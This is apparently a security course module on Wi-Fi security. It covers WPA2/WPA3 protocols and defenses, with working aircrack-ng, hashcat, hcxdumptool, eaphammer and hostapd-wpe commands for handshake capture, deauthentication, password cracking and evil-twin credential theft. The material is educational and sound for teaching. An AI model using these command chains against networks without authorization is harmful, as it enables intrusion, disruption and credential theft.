---
title: "Week 7 — Wireless Network Security & Attacks"
description: Master 802.11 protocol security, WPA2/WPA3 attacks, rogue access points, and wireless defense strategies.
---

# Week 7 — Wireless Network Security & Attacks

<div class="week-meta" markdown>
**Course Objectives:** CO4 &nbsp;|&nbsp; **Focus:** Wireless Security &nbsp;|&nbsp; **Difficulty:** ⭐⭐⭐☆☆
</div>

---

## Learning Objectives

- [ ] Explain WEP, WPA, WPA2, and WPA3 authentication and encryption mechanisms
- [ ] Capture WPA2 4-way handshakes and perform offline dictionary attacks
- [ ] Set up and conduct evil twin / rogue AP attacks
- [ ] Perform deauthentication attacks to force clients to reconnect
- [ ] Identify wireless attack countermeasures and enterprise defenses

---

## 1. Wireless Protocol Security Overview

### 1.1 Evolution of Wi-Fi Security

| Protocol | Year | Encryption | Auth | Status |
|----------|------|-----------|------|--------|
| **WEP** | 1997 | RC4 (broken) | Shared Key | ❌ Completely broken — never use |
| **WPA** | 2003 | TKIP/RC4 | PSK or 802.1X | ❌ Deprecated — vulnerable |
| **WPA2-Personal** | 2004 | AES-CCMP | PSK | ⚠️ Vulnerable to offline dict attack |
| **WPA2-Enterprise** | 2004 | AES-CCMP | 802.1X/EAP | ✅ Strong if configured correctly |
| **WPA3-Personal** | 2018 | SAE | Dragonfly | ✅ Resistant to offline attacks |
| **WPA3-Enterprise** | 2018 | 192-bit suite | 802.1X | ✅ Current gold standard |

### 1.2 WPA2-Personal Authentication (4-Way Handshake)

```
AP                           Client
│                              │
│ ←── Probe Request ──────── │
│ ──── Probe Response ──────→ │
│ ←── Authentication ─────── │
│ ──── Authentication ──────→ │
│ ←── Association Request ── │
│ ──── Association Response →  │
│                              │
│ ──── ANonce ─────────────→  │  (AP nonce)
│ ←── SNonce + MIC ──────── │  (Client nonce + message integrity)
│ ──── GTK + MIC ──────────→  │  (Group Temporal Key)
│ ←── ACK ───────────────── │
│                              │
    [ENCRYPTED TRAFFIC BEGINS]

ATTACKER captures this handshake → offline dictionary attack
```

---

## 2. Wireless Attack Setup

### 2.1 Hardware Requirements

```
Recommended adapters (monitor mode + packet injection):
  Alfa AWUS036ACS  → AC1200, 802.11ac, Realtek RTL8812AU
  Alfa AWUS036ACH  → 802.11ac dual-band, excellent range
  Alfa AWUS036NHA  → 802.11n, Atheros AR9271 (Kali native support)
  TP-Link TL-WN722N v1  → Atheros AR9271 (v2/v3 not supported!)
```

### 2.2 Wireless Interface Setup

```bash
# Check interface and driver
iwconfig
iw dev

# Enable monitor mode (airmon-ng method)
airmon-ng check kill           # Kill interfering processes
airmon-ng start wlan0          # Creates wlan0mon

# Enable monitor mode (manual method)
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up

# Verify monitor mode
iwconfig wlan0mon
# Should show: Mode:Monitor

# Channel hop or lock to specific channel
iwconfig wlan0mon channel 6
```

---

## 3. WPA2 Attacks

### 3.1 Aircrack-ng Suite — Capturing & Cracking

```bash
# Step 1: Survey nearby networks
airodump-ng wlan0mon

# Output:
# BSSID              PWR  Beacons  #Data  CH  MB   ENC  CIPHER  AUTH  ESSID
# AA:BB:CC:DD:EE:FF  -65      120     45   6  54   WPA2 CCMP    PSK   TargetWifi

# Step 2: Target specific AP and capture handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
#  -c 6          → Lock to channel 6
#  --bssid ...   → Target specific AP
#  -w capture    → Write to capture.cap

# Step 3: Deauthenticate client to force handshake (separate terminal)
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
# --deauth 10   → Send 10 deauth packets
# -a            → AP MAC
# -c            → Client MAC (omit for broadcast deauth)

# Step 4: Confirm handshake capture
# airodump-ng shows "WPA handshake: AA:BB:CC:DD:EE:FF" in top right

# Step 5: Crack with dictionary
aircrack-ng capture.cap -w /usr/share/wordlists/rockyou.txt

# Step 6: Crack with hashcat (GPU-accelerated, much faster)
# Convert .cap to hashcat format
hcxpcapngtool -o hash.hc22000 capture.cap
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r rules/best64.rule
```

### 3.2 PMKID Attack (WPA2 — No Client Needed)

```bash
# Capture PMKID from AP beacon (no handshake required)
hcxdumptool -o capture.pcapng -i wlan0mon --enable_status=1

# Extract PMKID hash
hcxpcapngtool -o pmkid.hc22000 capture.pcapng

# Crack
hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt

# Advantage: Works against AP directly — no need to wait for client
```

### 3.3 WEP Attack (Legacy Systems)

```bash
# WEP is trivially broken — statistical analysis of RC4 IV reuse
# Collect 50,000+ IVs, run statistical attack

# Capture WEP traffic + inject ARP replay to speed up IV collection
airodump-ng -c 1 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon  # ARP replay

# Crack when enough IVs collected
aircrack-ng wep_capture.cap
# WEP 64-bit: ~5,000 IVs needed
# WEP 128-bit: ~20,000 IVs needed
```

---

## 4. Evil Twin / Rogue Access Point

An evil twin creates a fake AP mimicking a legitimate one, tricking clients into connecting:

```bash
# Method 1: hostapd-wpe (WPA Enterprise evil twin)
# Capture enterprise credentials via RADIUS impersonation
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Method 2: airbase-ng (simple rogue AP)
airbase-ng -e "Free WiFi" -c 6 wlan0mon

# Method 3: eaphammer (comprehensive framework)
eaphammer -i wlan0 --channel 6 \
  --auth wpa-eap \
  --essid "CorpWifi" \
  --creds

# Method 4: Fluxion (social engineering framework)
# Creates captive portal on evil twin — victim enters PSK to "reconnect"
# SSID clone + deauth legitimate AP + capture PSK via web form
```

### Karma Attack

KARMA responds to **any** probe request from clients looking for previously connected networks:

```
Normal:   Client probes for "HomeWifi" → no response
KARMA:    Client probes for "HomeWifi" → Rogue AP responds "I am HomeWifi"
          Client connects without user interaction
```

---

## 5. Enterprise Wi-Fi Attacks (802.1X/EAP)

### EAP Types and Vulnerabilities

| EAP Type | Security | Attack Surface |
|----------|----------|----------------|
| EAP-MD5 | Broken | Offline dictionary attack on challenge/response |
| LEAP (Cisco) | Broken | Dictionary attack on MS-CHAPv2 |
| PEAP | Moderate | Server cert not validated → evil twin captures MS-CHAPv2 |
| EAP-TTLS | Moderate | Same issue as PEAP if client doesn't validate cert |
| EAP-TLS | Strong | Requires client certificates — difficult to attack |

```bash
# Capture PEAP/EAP-TTLS credentials with hostapd-wpe
# If client doesn't validate server certificate:
# → AP presents self-signed cert → Client accepts → MS-CHAPv2 captured

# Crack MS-CHAPv2 with asleap
asleap -C <challenge> -R <response> -W /usr/share/wordlists/rockyou.txt

# Or use crack.sh (online service, rainbow tables)
# Hash format: username:domain:challenge:response
```

---

## 6. Wireless Defense Strategies

!!! success "Enterprise Wireless Security Controls"

    **Technical Controls:**
    - Deploy **WPA3-Enterprise** (or WPA2-Enterprise minimum)
    - Require **EAP-TLS** (certificate-based, not password-based)
    - Implement **Wireless Intrusion Detection System (WIDS)** to detect rogue APs and deauth attacks
    - **Certificate pinning** on endpoints to detect evil twin attacks
    - **802.1X** for all network access — no PSK networks
    - **Network segmentation** — wireless on isolated VLAN

    **Operational Controls:**
    - Regular **rogue AP surveys** using professional WIDS tools
    - **Employee training** on evil twin and captive portal attacks
    - **Site survey** to minimize RF leakage outside building perimeter
    - **Airspace monitoring** — detect unauthorized APs continuously

---

## Key Vocabulary

| Term | Definition |
|------|------------|
| **WPA2-PSK** | Wi-Fi Protected Access 2, Pre-Shared Key — home/small office auth |
| **4-Way Handshake** | WPA2 authentication exchange — captured for offline attack |
| **PMKID** | Pairwise Master Key Identifier — enables handshake-free WPA2 attack |
| **Evil Twin** | Rogue AP mimicking legitimate network to capture credentials |
| **Deauthentication** | Management frame forcing client disconnection — unauthenticated |
| **KARMA** | Responds to all client probe requests — automatic association attack |
| **EAP** | Extensible Authentication Protocol — framework for enterprise auth |
| **Monitor Mode** | Wireless adapter mode capturing all frames (not just to/from it) |
| **Packet Injection** | Ability to forge and transmit 802.11 frames |

---

## Review Questions

!!! question "Self-Assessment"
    1. Why is WEP considered completely broken? Describe the cryptographic flaw.
    2. Explain the WPA2 4-way handshake. At what point can an attacker capture enough data for an offline dictionary attack?
    3. Describe the attack chain for compromising a corporate laptop using an evil twin attack in a coffee shop.
    4. A company uses PEAP for Wi-Fi authentication. Why is this vulnerable, and what is the fix?
    5. What technical control most effectively prevents evil twin attacks, and why?

---

## Further Reading

- 📖 *Hacking Exposed 7*, Chapter 9 — "Wireless Hacking"
- 📄 [Aircrack-ng Documentation](https://www.aircrack-ng.org/documentation.html)
- 📄 [eaphammer GitHub](https://github.com/s0lst1c3/eaphammer) — enterprise Wi-Fi attacks
- 📄 SANS SEC617 — Wireless Penetration Testing and Ethical Hacking
- 📄 IEEE 802.11 Standard — security architecture overview

---

*[← Week 6](week06.md) &nbsp;|&nbsp; [Course Index](index.md) &nbsp;|&nbsp; [Week 8 →](week08.md)*
